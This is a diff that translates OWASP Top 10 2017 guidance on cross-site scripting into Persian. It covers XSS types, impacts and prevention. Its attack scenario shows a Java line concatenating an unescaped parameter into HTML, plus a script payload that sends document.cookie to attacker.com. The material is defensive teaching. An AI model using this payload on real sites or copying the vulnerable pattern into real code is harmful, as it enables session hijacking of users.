@@ -1,45 +1,66 @@
-# A7:2017 Cross-Site Scripting (XSS)
+# <div dir="rtl" align="right">A7:2017 Cross-Site Scripting (XSS) </div>
 
 | Threat agents/Attack vectors | Security Weakness           | Impacts               |
 | -- | -- | -- |
-| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
-| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
+| Access Lvl : قابلیت بهره‌برداری: ۳ | شیوع: ۳ : قابل کشف بودن: ۳ | تکنیکی: ۲ : Business ? |
+| <div dir="rtl" align="right">ابزارهای خودکار می توانند تمام 3 شکل ممکن XSS را شناسایی و اکسپلویت کنند و چارچوب های اکسپلویت در دسترس رایگانی وجود دارد. </div> | <div dir="rtl" align="right">XSS دومین مسئله مهم در OWASP Top 10 است و در حدود دو سوم از تمام برنامه های کاربردی یافت می شود.ابزارهای خودکار می توانند برخی از مشکلات XSS را به صورت خودکار، به ویژه در فن آوری های بالغ مانند PHP، J2EE / JSP و ASP.NET پیدا کنند.</div> | <div dir="rtl" align="right">تأثیر XSS برای بازتاب و DOM XSS متوسط است و برای XSS ذخیره شده با اجرای کد از راه دور در مرورگر قربانی شدید است مانند سرقت اعتبارها، جلسات و یا ارائه بد افزارها به قربانیان.</div> |
 
-## Is the Application Vulnerable?
+## <div dir="rtl" align="right">آیا برنامه کاربردی آسیب پذیر است ؟</div>
 
-There are three forms of XSS, usually targeting users' browsers:
+<p dir="rtl" align="right">سه شکل از XSS وجود دارد که معمولا مرورگرهای کاربران را هدف قرار می دهند:</p>
 
-* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
-* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
-* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.
+<ul dir="rtl" align="right">
+  <li>
+    <strong>XSS  منعکس شده: </strong>
+    : برنامه یا API  شامل ورودی کاربر غیرقابل اعتبار و غیرقانونی به عنوان بخشی از خروجی HTML  است. یک حمله موفقیت آمیز می تواند به حمله کننده اجازه دهد HTML  و JavaScript  دلخواهی را در مرورگر قربانی اجرا کند. به طور معمول، کاربر نیاز به ارتباط با برخی از لینک های مخرب دارد که به یک صفحه کنترل شده توسط مهاجم اشاره می کند، مانند وب سایت های آگهی مخرب، تبلیغات و یا مشابه این ها.
+  </li>
+  <li>
+    <strong>XSS ذخیره شده: </strong>
+    برنامه کاربردی یا API ورودی کاربر تصفیه نشده را که بعدا توسط یک کاربر یا مدیر دیگر مشاهده می شود، ذخیره می کند. XSS ذخیره شده اغلب کاربر را با خطر بالایی از ریسک روبه رو می کند.
+  </li>
+  <li>
+    <strong>DOM XSS: </strong>
+    چارچوب های جاوا اسکریپت، برنامه های تک صفحه و API هایی که به طور پویا شامل داده های قابل کنترل مهاجم به یک صفحه می شوند، به DOM XSS  آسیب پذیر هستند. در حالت ایده آل، برنامه اطلاعات قابل کنترل مهاجم را به API  های جاوا اسکریپت نا امن ارسال نمی کند.
+  </li>
+</ul>
 
-Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
+<p dir="rtl" align="right">حملات متداول XSS  عبارتند از: سرقت نشست، گرفتن حساب، دور زدن MFA ، جایگزینی یا حذف گره DOM (از قبیل پانل های ورود به سیستم تروجان)، حملات علیه مرورگر کاربر مانند دریافت نرم افزارهای مخرب، کلید ورود به سیستم و سایر حملات سمت مشتری.</p>
 
-## How To Prevent
+## <div dir="rtl" align="right">نحوه پیشگیری از حمله</div>
 
-Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
+<p dir="rtl" align="right">پیشگیری ازXSS  نیاز به جداسازی داده های غیر قابل اعتماد از محتوای مرورگر فعال دارد. این کار با انجام موارد زیر قابل دسترسی است:</p>
 
-* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
-* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
-* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).
+<ul dir="rtl" align="right">
+  <li>
+    با استفاده از چارچوب هایی که به صورت خودکار از وقوع XSS فرار می کنند به وسیله طراحی، همانند آخرین Ruby on Rails، React JS. محدودیت های حفاظت XSS هر چارچوب را بیاموزید و به طور مناسب موارد استفاده را که پوشش داده نمی شوند، مدیریت کنید.
+  </li>
+  <li>
+    فرار داده های درخواستHTTP  نامعتبر براساس متن در خروجی HTML (بدنه، ویژگی، جاوا اسکریپت، CSS، یا URL ) آسیب پذیری های XSS  ذخیره شده و منعکس شده را حل خواهد کرد. 
+  </li>
+  <li>
+    با استفاده از رمزگذاری حساس به متن هنگام تغییر سند مرورگر در سمت مشتری بر علیه DOM XSS  عمل می کند. هنگامی که از انجام این کار اجتناب نکنیم، تکنیک های فرار از حساسیت متن مشابه می توانند به API  های مرورگر اعمال شوند، همانطور که در <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP Cheat Sheet 'DOM based XSS Prevention'</a>  توضیح داده شده است. 
+  </li>
+  <li>
+    فعال کردن یک سیاست <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">امنیتی محتوا (CSP) </a>یک کنترل دفاع در عمق در برابر XSS  است. این مؤثر است اگر هیچ آسیب پذیری دیگری وجود نداشته باشد که اجازه می دهد کدهای مخرب را از طریق فایل محلی شامل شود (مثلا مسیرهای رونویسی شده یا کتابخانه های آسیب پذیر از شبکه های تحویل مجاز محتوا).
+  </li>
+</ul>
 
-## Example Attack Scenario
+## <div dir="rtl" align="right">نمونه سناریو حمله</div>
 
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+<p dir="rtl" align="right"><strong>سناریو 1: </strong>برنامه بدون تایید یا escape، از داده های غیر قابل اعتماد در ساخت قطعه HTML زیر استفاده می کند:</p>
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+<p dir="rtl" align="right">مهاجم پارامتر CC را در مرورگر خود به صورت زیر تغییر می دهد :</p>
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+<p dir="rtl" align="right">این حمله باعث می شود شناسه نشست قربانی به وب سایت مهاجم ارسال شده و به مهاجم اجازه سرقت نشست فعلی کاربر را می دهد.</p>
 
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+<p dir="rtl" align="right"><strong>نکته : </strong>مهاجمان می توانند ازXSS  برای جلوگیری از هر گونه دفاع خودکار CSRF استفاده کنند. </p>
 
-## References
+## <div dir="rtl" align="right">منابع</div>
 
-### OWASP
+### <div dir="rtl" align="right">OWASP</div>
 
 * [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
 * [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
@@ -52,7 +73,7 @@ This attack causes the victim’s session ID to be sent to the attacker’s webs
 * [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 * [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
 
-### External
+### <div dir="rtl" align="right">خارجی</div>
 
 * [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
 * [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
